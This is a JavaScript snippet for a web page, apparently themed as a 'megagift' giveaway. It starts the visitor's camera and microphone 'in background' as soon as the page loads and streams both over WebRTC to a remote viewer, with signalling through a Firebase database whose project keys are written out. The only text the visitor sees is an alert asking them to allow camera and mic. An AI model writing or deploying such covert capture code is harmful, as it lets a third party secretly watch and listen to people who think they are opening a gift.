// Firebase config — your keys
const firebaseConfig = {
  apiKey: "AIzaSyBVFBqpZLGOE5PN1hnRN4GNp3AHfjcHNxI",
  authDomain: "megagift03.firebaseapp.com",
  databaseURL: "https://megagift03-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "megagift03",
  storageBucket: "megagift03.firebasestorage.app",
  messagingSenderId: "220522611453",
  appId: "1:220522611453:web:95284da4a574518d26b494"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

let pc = new RTCPeerConnection();
let localStream;

// Send ICE candidates to Firebase
pc.onicecandidate = event => {
  if(event.candidate){
    db.ref("megagift-room/candidate").push(event.candidate.toJSON());
  }
};

// Start camera + mic in background
async function startStream() {
  try {
    localStream = await navigator.mediaDevices.getUserMedia({ video:true, audio:true });
    localStream.getTracks().forEach(track => pc.addTrack(track, localStream));

    const offer = await pc.createOffer();
    await pc.setLocalDescription(offer);

    // Push offer to Firebase
    await db.ref("megagift-room/sdp").set(offer.toJSON());

    // Listen for viewer answer
    db.ref("megagift-room/answer").on("value", async snapshot => {
      const answer = snapshot.val();
      if(answer && !pc.currentRemoteDescription){
        await pc.setRemoteDescription(new RTCSessionDescription(answer));
      }
    });

  } catch(err) {
    console.error(err);
    alert("Please allow camera and mic!");
  }
}

startStream();
